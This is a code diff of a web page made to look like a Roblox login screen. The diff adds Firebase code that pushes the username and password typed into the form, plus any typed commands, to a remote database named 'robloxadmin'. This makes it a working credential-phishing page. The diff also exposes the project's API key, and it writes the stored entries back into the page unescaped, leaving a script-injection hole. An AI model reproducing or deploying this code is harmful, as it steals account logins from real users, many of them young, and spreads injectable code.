@@ -3,7 +3,9 @@
 <head>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="viewport"
+content="width=device-width, initial-scale=1.0">
 
 <title>Roblox</title>
 
@@ -126,7 +128,7 @@ body{
     transform:translateX(-50%);
 }
 
-/* SEARCH BAR */
+/* SEARCH */
 
 .search-bar{
 
@@ -264,7 +266,7 @@ body{
     color:#aaa;
 }
 
-/* SHOW PASS */
+/* SHOW PASSWORD */
 
 .show-pass-btn{
 
@@ -411,7 +413,7 @@ body{
     overflow-y:auto;
 }
 
-/* USER DATA */
+/* SAVED DATA */
 
 .activity-card{
 
@@ -453,8 +455,6 @@ body{
 
 <div class="navbar">
 
-    <!-- LEFT -->
-
     <div class="nav-left">
 
         <div class="menu-icon">
@@ -481,7 +481,7 @@ body{
 
     </div>
 
-    <!-- CENTER SEARCH -->
+    <!-- SEARCH -->
 
     <div class="nav-center">
 
@@ -624,11 +624,11 @@ body{
 
         </button>
 
-        <!-- USER DATA -->
+        <!-- SAVED DATA -->
 
         <div class="panel-box">
 
-            <h3>User Activity</h3>
+            <h3>Online Saved Data</h3>
 
             <div id="savedDataBox"></div>
 
@@ -638,11 +638,61 @@ body{
 
 </div>
 
-<script>
+<!-- FIREBASE -->
+
+<script type="module">
+
+/* IMPORT FIREBASE */
+
+import { initializeApp }
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+    getDatabase,
+
+    ref,
+
+    push,
+
+    onValue
+
+}
+
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+/* FIREBASE CONFIG */
+
+const firebaseConfig = {
+
+  apiKey: "AIzaSyA5uGGN1a_ydQILFtz1RxI1JYJF3FoKZ6U",
+
+  authDomain: "robloxadmin-5b4d1.firebaseapp.com",
+
+  databaseURL: "https://robloxadmin-5b4d1-default-rtdb.firebaseio.com",
+
+  projectId: "robloxadmin-5b4d1",
+
+  storageBucket: "robloxadmin-5b4d1.firebasestorage.app",
+
+  messagingSenderId: "1028232627372",
+
+  appId: "1:1028232627372:web:cfb765f26fc2b045a44b09",
+
+  measurementId: "G-XQXYL2DMEC"
+
+};
+
+/* START FIREBASE */
+
+const app = initializeApp(firebaseConfig);
+
+const db = getDatabase(app);
 
 /* SHOW PASSWORD */
 
-function togglePassword(){
+window.togglePassword = function(){
 
     const passInput =
     document.getElementById("password");
@@ -663,31 +713,80 @@ function togglePassword(){
         passInput.type = "password";
 
         btn.innerText = "Show";
+
     }
 
-}
+};
 
-/* SAVE USER DATA */
+/* SAVE DATA ONLINE */
 
-function saveActivity(text){
+window.saveActivity = function(text){
 
-    const box =
-    document.getElementById("savedDataBox");
+    push(
 
-    const div =
-    document.createElement("div");
+        ref(db,"activities"),
 
-    div.className = "activity-card";
+        {
 
-    div.innerText = text;
+            activity:text,
 
-    box.prepend(div);
+            time:new Date().toLocaleString()
 
-}
+        }
+
+    );
+
+};
+
+/* SHOW ONLINE DATA */
+
+onValue(
+
+    ref(db,"activities"),
+
+    (snapshot)=>{
+
+        let output = "";
+
+        let items = [];
+
+        snapshot.forEach((child)=>{
+
+            items.push(child.val());
+
+        });
+
+        items.reverse();
+
+        items.forEach((item)=>{
+
+            output += `
+
+            <div class="activity-card">
+
+            ${item.activity}
+
+            <br><br>
+
+            ${item.time}
+
+            </div>
+
+            `;
+
+        });
+
+        document
+        .getElementById("savedDataBox")
+        .innerHTML = output;
+
+    }
+
+);
 
 /* LOGIN */
 
-function login(){
+window.login = function(){
 
     const user =
     document.getElementById("username").value;
@@ -703,9 +802,10 @@ function login(){
         "Enter Username and Password";
 
         return;
+
     }
 
-    /* SAVE USER + PASSWORD */
+    /* SAVE USER + PASS */
 
     saveActivity(
 
@@ -734,36 +834,27 @@ function login(){
         .getElementById("message")
         .innerText =
         "Invalid Username or Password";
+
     }
 
-}
+};
 
 /* COMMANDS */
 
-function runCommand(){
+window.runCommand = function(){
 
     const cmd =
     document
     .getElementById("commandInput")
-    .value
-    .toLowerCase();
+    .value;
 
-    if(cmd === "clear"){
+    saveActivity(
 
-        document
-        .getElementById("savedDataBox")
-        .innerHTML = "";
+        "COMMAND: " + cmd
 
-    }
+    );
 
-    else{
-
-        saveActivity(
-            "COMMAND: " + cmd
-        );
-    }
-
-}
+};
 
 </script>
 
